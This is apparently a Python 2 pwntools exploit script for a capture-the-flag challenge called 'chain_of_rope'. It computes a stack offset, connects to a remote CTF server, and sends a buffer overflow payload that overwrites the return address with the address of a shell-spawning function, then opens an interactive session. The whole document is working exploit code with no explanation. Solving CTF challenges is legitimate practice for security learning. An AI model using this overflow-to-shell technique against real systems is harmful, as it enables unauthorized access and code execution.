# python2
# coding=utf-8
from pwn import *

authorize = 0x401196
addBalance = 0x4011ab
flag = 0x4011eb
shell = 0x401231

user_in = 0x40133b
start_1 = 0x7fffffffe3e0
first_ret = 0x7fffffffe418
pad_1 = first_ret - start_1
print pad_1

r = remote('shell.actf.co', 19400)
# r = process('./chain_of_rope')
r.recvuntil('3 - Grant access')
r.sendline('1')
r.sendline('a' * (pad_1) + p64(shell))
print r.interactive()
